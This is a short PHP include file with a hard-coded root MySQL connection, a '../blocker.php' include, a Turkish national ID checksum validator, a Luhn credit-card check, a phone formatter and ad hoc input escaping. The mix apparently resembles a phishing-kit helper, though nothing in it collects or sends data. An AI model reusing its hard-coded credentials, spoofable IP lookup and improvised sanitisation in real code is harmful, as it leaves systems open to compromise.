<?php 

error_reporting(0);


try 
{
	$db=new PDO("mysql:host=localhost;dbname=hammurabix;charset=utf8",'root','ankara2025');
}
catch (PDOExpception $e) 
{
	echo $e->getMessage();
}

function guvenlik($gelen)
{
    $giden = addslashes($gelen);
    $giden = htmlspecialchars($giden);
    $giden = strip_tags($giden);
    $giden = htmlentities($giden);

    return $giden;
}

include '../blocker.php';

function GetIP() 
{ 
	if (getenv("HTTP_CLIENT_IP") && strcasecmp(getenv("HTTP_CLIENT_IP"), "unknown")) 
		$ip = getenv("HTTP_CLIENT_IP"); 
	else if (getenv("HTTP_X_FORWARDED_FOR") && strcasecmp(getenv("HTTP_X_FORWARDED_FOR"), "unknown")) 
		$ip = getenv("HTTP_X_FORWARDED_FOR"); 
	else if (getenv("REMOTE_ADDR") && strcasecmp(getenv("REMOTE_ADDR"), "unknown")) 
		$ip = getenv("REMOTE_ADDR"); 
	else if (isset($_SERVER['REMOTE_ADDR']) && $_SERVER['REMOTE_ADDR'] && strcasecmp($_SERVER['REMOTE_ADDR'], "unknown")) 
		$ip = $_SERVER['REMOTE_ADDR']; 
	else 
		$ip = "unknown"; 
	return($ip); 
} 

function tcno_kontrol($tc = null)
{ 
    //koşullara uygun ama doğru olamayacak değerler dizisi
    $filtre = array(
        11111111110, 22222222220, 33333333330, 
        44444444440, 55555555550, 66666666660, 
        77777777770,88888888880, 99999999990
    );
 
    //Parametre string türüne döndürülüyor
    $tc =(string) $tc;
 
    /* • İlk rakam 0 ise veya
       • Parametre tamamen rakam değil ise veya
       • Parametre 11 karakterden oluşmuyor ise veya
       • Parametre gönderilmemiş ise veya
       • Parametre fltre içinde var ise FALSE değer döndür */
    if( $tc[0] == 0 || !ctype_digit($tc) || strlen($tc)!=11 || is_null($tc) || in_array($tc, $filtre)){
       return false;  
    }else{ 
 
        //Parametrenin 1, 3, 5, 7 ve 9. değerdeki rakamları topla
        $tek_toplam = $tc[0] + $tc[2] + $tc[4] + $tc[6] + $tc[8] ;
 
        //Parametrenin 2, 4, 6 ve 8. değerdeki rakamları topla
        $cift_toplam = $tc[1] + $tc[3] + $tc[5] + $tc[7];
 
        //1,3,5,7,9 değerindeki rakamlar toplamını 9 ile çarpıp çift rakamlar toplamını çıkar
        $on_sonuc = ($tek_toplam * 7) - $cift_toplam;
 
        // 1,2,3,4,5,6,7,8,9 ve 10. anahtardaki rakamları topla
        $on_toplam = 0;
        for($i = 0; $i < 10; $i++){
            $on_toplam = $on_toplam + $tc[$i];
        }//for döngü bitimi
        
        
        /*  • 1,3,5,7,9 toplam 7 çarpım ve 2,4,6,8 çıkarma sonucunun 10 a bölümünden kalan 10. rakama eşit değil ise veya
            • İlk 10  rakam toplamının 10 a bölümünden kalan 11. rakama eşit değil ise FALSE döndür*/
        if( $on_sonuc % 10 != $tc[9] || $on_toplam % 10 != $tc[10] ){
            return false; 
 
        //Eğer hiç bir sorun yok ise TC NO doğrudur TRUE döndür.
        }else{  
 
           return true;
 
        }//else koşul bitimi
 
    }//else koşul bitimi
 
}//tcno_kontrol() fonksiyon bitimi

function luhn_check($number) {

  // Strip any non-digits (useful for credit card numbers with spaces and hyphens)
  $number=preg_replace('/\D/', '', $number);

  // Set the string length and parity
  $number_length=strlen($number);
  $parity=$number_length % 2;

  // Loop through each digit and do the maths
  $total=0;
  for ($i=0; $i<$number_length; $i++) {
    $digit=$number[$i];
    // Multiply alternate digits by two
    if ($i % 2 == $parity) {
      $digit*=2;
      // If the sum is two digits, add them together (in effect)
      if ($digit > 9) {
        $digit-=9;
      }
    }
    // Total up the digits
    $total+=$digit;
  }

  // If the total mod 10 equals 0, the number is valid
  return ($total % 10 == 0) ? TRUE : FALSE;

}

function format_phone($phone)
{
    $phone = preg_replace("/[^0-9]/", "", $phone);
 
    if(strlen($phone) == 11){
        return preg_replace("/([0-9]{1})([0-9]{3})([0-9]{3})([0-9]{2})([0-9]{2})/", "$1-($2)-$3-$4-$5 " ,$phone);
    }else{
        return 0;
    }
}
 ?>